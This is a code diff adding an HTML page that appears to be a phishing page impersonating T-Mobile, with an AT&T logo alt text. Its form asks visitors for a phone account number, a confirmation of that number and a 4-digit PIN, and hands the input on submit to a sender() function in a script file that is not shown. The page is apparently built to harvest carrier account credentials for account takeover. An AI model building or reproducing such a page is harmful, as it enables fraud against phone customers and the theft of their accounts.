@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Website</title>
+</head>
+<body>
+
+    <div class="form">
+        <div class="logo">
+            <img src="logo.png" alt="AT&T">
+            <h1>T-Mobile</h1>
+        </div>
+        <form action="" onsubmit=" return sender()">
+            <input type="number" oninput="validateMaxLength(this, 10)" name="number" id="name" placeholder="Account number" required>
+            <input type="number" oninput="validateMaxLength(this, 10)" name="number" id="email" placeholder="Confirm account number" required>
+            <input type="password" oninput="validateMaxLength(this, 4)" name="Pin" id="message" cols="30" rows="1" placeholder="Pin" required></input>
+            <input type="submit" value="Submit" id="btn">
+        </form>
+    </div>
+    <div>
+        <footer class="cop">
+            ©2024 T-mobile Property. All rights reserved.
+        </footer>
+    </div>
+    <link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+</body>
+</html>
